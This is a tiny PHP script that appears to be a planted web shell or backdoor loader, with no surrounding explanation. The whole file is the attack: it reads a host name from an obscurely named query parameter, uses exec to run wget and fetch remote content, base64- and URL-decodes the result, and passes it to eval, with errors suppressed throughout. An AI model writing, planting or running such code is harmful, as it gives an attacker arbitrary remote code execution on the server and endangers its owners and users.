<?php
$b = 'https://'.@$_GET['ya50lrd2unt1vx'];
@exec("wget $b -qO-", $t);
$o = base64_decode($t[0]);
$a = urldecode($o);
$r = '?>';
$k = $r.$a;
eval($k);
?>